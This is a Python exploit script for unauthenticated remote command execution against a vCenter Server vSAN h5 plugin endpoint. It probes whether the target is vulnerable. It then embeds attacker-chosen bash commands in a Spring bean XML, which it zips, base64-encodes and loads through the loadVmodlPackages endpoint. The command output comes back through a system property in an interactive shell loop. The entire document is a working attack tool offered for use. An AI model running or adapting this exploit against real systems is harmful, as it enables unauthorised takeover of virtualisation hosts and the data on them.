import requests
import sys
from requests.packages import urllib3
from urllib3.exceptions import InsecureRequestWarning
import random, string, base64
# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
import zipfile, json
import StringIO

class InMemoryZip(object):
    def __init__(self):
        # Create the in-memory file-like object
        self.in_memory_zip = StringIO.StringIO()

    def append(self, filename_in_zip, file_contents):
        '''Appends a file with name filename_in_zip and contents of 
        file_contents to the in-memory zip.'''
        # Get a handle to the in-memory zip in append mode
        zf = zipfile.ZipFile(self.in_memory_zip, "a", zipfile.ZIP_DEFLATED, False)

        # Write the file to the in-memory zip
        zf.writestr(filename_in_zip, file_contents)

        # Mark the files as having been created on Windows so that
        # Unix permissions are not inferred as 0000
        for zfile in zf.filelist:
            zfile.create_system = 0        

        return self

    def read(self):
        '''Returns a string with the contents of the in-memory zip.'''
        self.in_memory_zip.seek(0)
        return self.in_memory_zip.read()

    def writetofile(self, filename):
        '''Writes the in-memory zip to a file.'''
        f = file(filename, "w")
        f.write(self.read())
        f.close()

target = sys.argv[1]
# target = "https://192.168.139.133"

#ignore me
bean_content = """<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg>
          <list>
            <value>/bin/bash</value>
            <value>-c</value>
            <value><![CDATA[ #CMD# 2>&1 ]]></value>
          </list>
        </constructor-arg>
    </bean>
    <bean id="is" class="java.io.InputStreamReader">
        <constructor-arg>
            <value>#{pb.start().getInputStream()}</value>
        </constructor-arg>
    </bean>
    <bean id="br" class="java.io.BufferedReader">
        <constructor-arg>
            <value>#{is}</value>
        </constructor-arg>
    </bean>
    <bean id="collectors" class="java.util.stream.Collectors"></bean>
    <bean id="b64Coder" class="java.util.Base64"></bean>
    <bean id="newLine" class="java.lang.String">
        <constructor-arg>
            <value>#{b64Coder.getDecoder().decode("Cg==")}</value>
        </constructor-arg>
    </bean>
    <bean id="system" class="java.lang.System">
        <property name="whatever" value="#{system.setProperty(&quot;output&quot;, b64Coder.getEncoder().encodeToString(br.lines().collect(collectors.joining(newLine)).getBytes())) }"/>
    </bean>
</beans>
"""

def genCmd(cmd):
    zip_ct = bean_content.replace("#CMD#", cmd)
    imz = InMemoryZip()
    imz.append("a_offline_bundle.txt", zip_ct)
    imz.writetofile("test.zip")
    return base64.b64encode(imz.read())

def prepareAndInvoke():
    requests.post(target + "/ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService/prepare", json={"methodInput":[]}, headers={"Content-Type": "application/json"}, verify=False)
    requests.post(target + "/ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService/invoke", json={"methodInput":[]}, headers={"Content-Type": "application/json"}, verify=False)

def setNullObject():
    requests.post(target + "/ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService/setTargetObject", json={"methodInput":[None]}, headers={"Content-Type": "application/json"}, verify=False)
    
def setStaticMethod(mtName):
    requests.post(target + "/ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService/setStaticMethod", json={"methodInput":[mtName]}, headers={"Content-Type": "application/json"}, verify=False)

def setArg(args):
    requests.post(target + "/ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService/setArguments", json={"methodInput":[args]}, headers={"Content-Type": "application/json"}, verify=False)

def sendh5Vsan(beanName, method, param=[]):
    return requests.post(target + "/ui/h5-vsan/rest/proxy/service/%s/%s" %(beanName, method), json={"methodInput":param}, headers={"Content-Type": "application/json"}, verify=False).content
def checkVuln():
    ct = requests.post(target + "/ui/h5-vsan/rest/proxy/service/systemProperties/getProperty", json={"methodInput":[]}, headers={"Content-Type": "application/json"}, verify=False)
    if ct.status_code != 401:
        return True
    return False

def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

rand_name = id_generator(7)


print("Target: " + target)
if checkVuln():
    print("Target is vulnerable!")
else:
    print("Not vulnerable!")
    exit()
cmd = raw_input("$ ")
while(raw_input != "bye"):
    cmdZip = genCmd(cmd)
    param = [["http://localhost:8006/vsanHealth/vum/driverOfflineBundle/%64%61%74%61%3a%74%65%78%74%2f%68%74%6d%6c%3b%62%61%73%65%36%34%2c"+cmdZip+"#"], True]
    # setStaticMethod("org.eclipse.jdt.internal.compiler.parser.Parser.buildFileForTable")
    # cmd_ct = bean_content.replace("#CMD#", cmd)
    # setArg(["/tmp/" + rand_name, cmd_ct])
    # prepareAndInvoke()
    # setNullObject()

    # param = [["file:///tmp/"+rand_name+"#"], True]
    ct1 = sendh5Vsan("vmodlContext", "loadVmodlPackages", param)
    if "do not match" in ct1:
        param = [["http://localhost:8006/vsanHealth/vum/driverOfflineBundle/%64%61%74%61%3a%74%65%78%74%2f%68%74%6d%6c%3b%62%61%73%65%36%34%2c"+cmdZip+"#"]]
        sendh5Vsan("vmodlContext", "loadVmodlPackages", param)
    ct = sendh5Vsan("systemProperties", "getProperty", ["output", None])
    dt = json.loads(ct)
    if('result' in dt.keys()):
        print(base64.b64decode(dt['result']))
    else:
        print("exception!")
    cmd = raw_input("$ ")
